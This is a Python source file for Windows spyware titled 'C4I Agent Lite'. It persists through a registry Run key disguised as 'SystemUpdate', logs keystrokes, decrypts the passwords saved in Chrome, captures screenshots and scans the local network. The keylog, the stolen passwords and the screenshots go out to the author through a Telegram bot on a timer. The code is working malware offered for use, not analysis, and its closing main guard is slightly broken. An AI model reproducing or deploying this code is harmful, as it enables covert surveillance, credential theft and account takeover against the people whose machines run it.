# === C4I Agent Lite FINAL ===
# Version: Telegram + Keylogger + Password Dumper + Screenshot + Network Watch

import os
import sys
import time
import socket
import logging
import platform
import threading
import requests
import subprocess
from pynput import keyboard
from PIL import ImageGrab
from datetime import datetime
from apscheduler.schedulers.background import BackgroundScheduler

# ========== CONFIG ==========
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
SEND_INTERVAL = 3600  # send every hour
APPDATA = os.getenv("APPDATA")
LOG_FILE = os.path.join(APPDATA, "syslog.txt")
PASS_FILE = os.path.join(APPDATA, "chromepass.txt")

# ========== AUTO START ==========
def add_to_startup():
    exe_path = sys.executable
    reg_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
    except:
        pass

# ========== KEYLOGGER ==========
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except:
        logging.info(str(key))

listener = keyboard.Listener(on_press=on_press)
listener.daemon = True
listener.start()

# ========== CHROME PASSWORD DUMPER ==========
def dump_chrome_passwords():
    try:
        import sqlite3
        import shutil
        import win32crypt

        path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\\Chrome\\User Data\\Default\\Login Data")
        db_copy = os.path.join(APPDATA, "LoginData.db")
        shutil.copyfile(path, db_copy)

        conn = sqlite3.connect(db_copy)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        with open(PASS_FILE, 'w', encoding='utf-8') as f:
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                try:
                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                    f.write(f"Site: {url}\nUsername: {username}\nPassword: {password.decode()}\n{'-'*40}\n")
                except:
                    continue
        conn.close()
    except:
        pass

# ========== SCREENSHOT ==========
def take_screenshot():
    try:
        img = ImageGrab.grab()
        file_path = os.path.join(APPDATA, "screenshot.jpg")
        img.save(file_path)
        return file_path
    except:
        return None

# ========== NETWORK SCANNER ==========
def scan_network():
    result = []
    try:
        ip_base = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0] + '.'
        for i in range(1, 255):
            ip = ip_base + str(i)
            try:
                name = socket.gethostbyaddr(ip)[0]
                result.append(f"{ip} - {name}")
            except:
                continue
    except:
        pass
    return result

# ========== SEND TO TELEGRAM ==========
def send_file(file_path, caption):
    try:
        with open(file_path, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", data={"chat_id": CHAT_ID, "caption": caption}, files={"document": f})
    except:
        pass

def send_message(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})
    except:
        pass

# ========== CHECK INTERNET ==========
import urllib.request
def is_connected():
    try:
        urllib.request.urlopen("https://www.google.com", timeout=5)
        return True
    except:
        return False

# ========== HOURLY TASK ==========
def send_hourly_report():
    devices = scan_network()
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    report = f"🖥 Active Devices Report ({now}):\n"
    if devices:
        report += "\n".join(devices)
    else:
        report += "No devices found."
    send_message(report)
# ========== MAIN LOOP ==========
def main():
    add_to_startup()

    scheduler = BackgroundScheduler()
    scheduler.add_job(send_hourly_report, 'interval', seconds=SEND_INTERVAL)
    scheduler.start()

    while True:
        time.sleep(1800)  # كل نص ساعة
        dump_chrome_passwords()
        if is_connected():
            send_file(LOG_FILE, "📝 Keylogger Report")
            send_file(PASS_FILE, "🔑 Chrome Passwords")
            screenshot = take_screenshot()
            if screenshot:
                send_file(screenshot, "🖼 Screenshot")

if name == 'main':
    main()
    